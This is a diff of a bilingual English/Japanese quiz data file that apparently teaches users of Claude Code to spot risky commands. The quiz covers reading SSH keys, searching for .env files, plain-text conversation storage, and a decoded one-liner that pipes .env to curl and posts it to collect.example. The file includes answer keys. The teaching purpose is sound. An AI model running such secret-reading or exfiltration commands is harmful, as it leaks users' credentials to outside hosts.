         "ja": "SSH の秘密鍵を表示するコマンドです。対になる `id_rsa.pub`（公開鍵）は人に渡してよいものですが、`id_rsa` は決して渡してはいけません。プロジェクトの作業でこのファイルが必要になることはまずないので、これを読むコマンドが出てきたら、手を止めて理由を確認しましょう。"
@@ -594,7 +893,9 @@
         "en": "`todo.txt` holds 40 lines of your notes. Then this runs:",
         "ja": "`todo.txt` には、あなたのメモが40行入っています。そこで次のコマンドが実行されます。"
       },
-      "code": ["echo \"buy milk\" > todo.txt"],
+      "code": [
+        "echo \"buy milk\" > todo.txt"
+      ],
       "opts": [
         {
           "text": {
@@ -693,10 +994,215 @@
           }
         }
       ],
-      "order": ["pipe", "grep", "home", "ls", "a"],
+      "order": [
+        "pipe",
+        "grep",
+        "home",
+        "ls",
+        "a"
+      ],
       "explain": {
         "en": "It lists everything in your home folder, hidden names included, and keeps the ones containing \"env\", like a stray `.env`. It changes nothing, but it is exactly how you'd go looking for secrets, so ask what it's for.",
         "ja": "ホームフォルダの中身を隠れた名前も含めて一覧にし、「env」を含むもの（置き忘れの `.env` など）だけを残します。何も変更しませんが、秘密情報を探すときのやり方そのものなので、何のために実行するのかを確認しましょう。"
+      }
+    },
+    {
+      "id": "computer-pairs-3",
+      "type": "pairs",
+      "prompt": {
+        "en": "Match each of Claude Code's paths to what's inside.",
+        "ja": "Claude Code のパスと、その中身を組み合わせましょう。"
+      },
+      "items": [
+        {
+          "id": "projects",
+          "left": {
+            "en": "~/.claude/projects/",
+            "ja": "~/.claude/projects/"
+          },
+          "leftMono": true,
+          "right": {
+            "en": "Every conversation, saved as plain text",
+            "ja": "すべての会話。プレーンテキストで保存"
+          }
+        },
+        {
+          "id": "claudejson",
+          "left": {
+            "en": "~/.claude.json",
+            "ja": "~/.claude.json"
+          },
+          "leftMono": true,
+          "right": {
+            "en": "Your sign-in, MCP servers, and trusted folders",
+            "ja": "ログイン情報、MCP サーバー、信頼したフォルダ"
+          }
+        },
+        {
+          "id": "usersettings",
+          "left": {
+            "en": "~/.claude/settings.json",
+            "ja": "~/.claude/settings.json"
+          },
+          "leftMono": true,
+          "right": {
+            "en": "Your own Claude Code settings, for every project",
+            "ja": "すべてのプロジェクトに効く、あなた自身の Claude Code の設定"
+          }
+        },
+        {
+          "id": "projectdir",
+          "left": {
+            "en": ".claude/ (in a project)",
+            "ja": ".claude/（プロジェクト内）"
+          },
+          "leftMono": true,
+          "right": {
+            "en": "Settings, skills and agents shared with everyone on the project",
+            "ja": "プロジェクトのメンバー全員で共有する設定、スキル、エージェント"
+          }
+        }
+      ],
+      "order": [
+        "claudejson",
+        "projectdir",
+        "projects",
+        "usersettings"
+      ],
+      "explain": {
+        "en": "Three of these sit in your home folder and follow you to every project. The project's `.claude/` travels with the project. The conversations under `~/.claude/projects/` hold whatever Claude saw, secrets included.",
+        "ja": "このうち3つはホームフォルダにあり、どのプロジェクトでも使われます。プロジェクトの `.claude/` は、プロジェクトと一緒に共有されます。`~/.claude/projects/` の会話には、Claude が見たものが秘密情報も含めてすべて残っています。"
+      },
+      "more": {
+        "slug": "claude-directory"
+      }
+    },
+    {
+      "id": "computer-predict-5",
+      "type": "predict",
+      "prompt": {
+        "en": "What does this print?",
+        "ja": "このコマンドは何を表示しますか？"
+      },
+      "situation": {
+        "en": "Last week you pasted your payment key, `sk_live_FAKE_41a9...`, into a Claude Code chat to fix a bug. Then you closed the session. Now you search that project's saved conversations:",
+        "ja": "先週、バグを直すために、決済キー `sk_live_FAKE_41a9...` を Claude Code のチャットに貼り付けました。そのあとセッションを閉じました。今、そのプロジェクトの保存された会話を検索します。"
+      },
+      "code": [
+        "grep -l sk_live_FAKE ~/.claude/projects/-Users-you-portfolio/*.jsonl"
+      ],
+      "opts": [
+        {
+          "text": {
+            "en": "The path of last week's conversation file",
+            "ja": "先週の会話のファイルのパス"
+          },
+          "feedback": {
+            "en": "Right. The conversation, your key included, is still on disk in plain text. `-l` makes `grep` print only the paths of the files that match.",
+            "ja": "正解です。会話はキーも含めて、プレーンテキストのままディスクに残っています。`-l` を付けると、`grep` は一致したファイルのパスだけを表示します。"
+          }
+        },
+        {
+          "text": {
+            "en": "Nothing: closing a session erases it",
+            "ja": "何も表示されない（セッションを閉じると消えるから）"
+          },
+          "feedback": {
+            "en": "Closing a session doesn't delete it. Claude Code saves every conversation so you can resume it, and by default keeps it for 30 days.",
+            "ja": "セッションを閉じても削除されません。Claude Code は再開できるようにすべての会話を保存していて、標準では30日間残します。"
+          }
+        },
+        {
+          "text": {
+            "en": "Nothing: conversations are encrypted, so the key can't be found",
+            "ja": "何も表示されない（会話は暗号化されているから）"
+          },
+          "feedback": {
+            "en": "They aren't encrypted. Your file permissions are the only lock, and a command running as you passes right through them.",
+            "ja": "会話は暗号化されていません。守っているのはファイルのアクセス権だけで、あなたとして動くコマンドはそれを素通りできます。"
+          }
+        },
+        {
+          "text": {
+            "en": "An error: Claude Code's folder is locked",
+            "ja": "エラーになる（Claude Code のフォルダはロックされているから）"
+          },
+          "feedback": {
+            "en": "`~/.claude` is an ordinary hidden folder in your home. You, and any command running as you, can read it.",
+            "ja": "`~/.claude` はホームにあるふつうの隠しフォルダです。あなたも、あなたとして動くコマンドも、中を読めます。"
+          }
+        }
+      ],
+      "answer": 0,
+      "explain": {
+        "en": "Every message you paste is written to a plain-text file under `~/.claude/projects/`. Keep secrets out of the chat, and replace any key that got in.",
+        "ja": "貼り付けたメッセージはすべて、`~/.claude/projects/` の下のプレーンテキストのファイルに書き込まれます。秘密情報はチャットに入れないようにし、入ってしまったキーは新しいものに取り替えましょう。"
+      },
+      "more": {
+        "slug": "claude-directory",
+        "anchor": "plaintext-storage"
+      }
+    },
+    {
+      "id": "computer-decode-4",
+      "type": "decode",
+      "prompt": {
+        "en": "Match each piece of the command to what it does.",
+        "ja": "コマンドの各部分と、その働きを組み合わせましょう。"
+      },
+      "command": "cat .env | curl -d @- https://collect.example/upload",
+      "parts": [
+        {
+          "id": "cat",
+          "code": "cat .env",
+          "means": {
+            "en": "Print the project's secrets",
+            "ja": "プロジェクトの秘密情報を表示する"
+          }
+        },
+        {
+          "id": "pipe",
+          "code": "|",
+          "means": {
+            "en": "Hand that output to the next command",
+            "ja": "その出力を次のコマンドに渡す"
+          }
+        },
+        {
+          "id": "curl",
+          "code": "curl",
+          "means": {
+            "en": "Talk to a website over the internet",
+            "ja": "インターネット上のサイトとやりとりする"
+          }
+        },
+        {
+          "id": "data",
+          "code": "-d @-",
+          "means": {
+            "en": "Send what came through the pipe as data",
+            "ja": "パイプから届いたものをデータとして送る"
+          }
+        },
+        {
+          "id": "url",
+          "code": "https://collect.example/upload",
+          "means": {
+            "en": "A website that receives it",
+            "ja": "それを受け取るサイト"
+          }
+        }
+      ],
+      "order": [
+        "curl",
+        "url",
+        "cat",
+        "data",
+        "pipe"
+      ],
+      "explain": {
+        "en": "It uploads your `.env` file, keys and all, to a website. Each piece looks ordinary on its own; together, they send your secrets away. A command that reads a secret and talks to the internet in one go is a reason to stop.",
+        "ja": "`.env` ファイルを、キーも含めてそのままウェブサイトに送信するコマンドです。1つずつ見るとふつうの部品ですが、組み合わさると秘密情報を外へ送り出します。秘密情報を読んで、そのままインターネットに送るコマンドを見たら、手を止めましょう。"
       }
     }
   ]
